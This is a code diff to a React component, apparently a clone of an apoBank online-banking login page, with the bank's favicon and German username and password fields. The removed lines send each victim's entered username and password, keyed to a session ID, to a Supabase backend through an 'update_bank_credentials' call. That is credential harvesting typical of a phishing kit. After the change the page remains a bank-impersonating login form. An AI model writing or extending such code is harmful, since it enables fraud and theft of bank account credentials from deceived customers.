@@ -1,6 +1,5 @@
 import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import faviconAsset from "@/assets/favicons/apobank.webp.asset.json";
@@ -33,20 +32,10 @@ const ApobankCopy = () => {
 
   const canSubmit = username.trim().length > 0 && password.length > 0;
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!canSubmit || submitting) return;
     setSubmitting(true);
-    if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
-        p_session_id: sessionId,
-        p_username: username,
-        p_password: password,
-        p_username_label: "Benutzername",
-        p_password_label: "Passwort",
-      });
-      if (error) console.error("Update failed:", error);
-    }
     setShowLoading(true);
   };
 
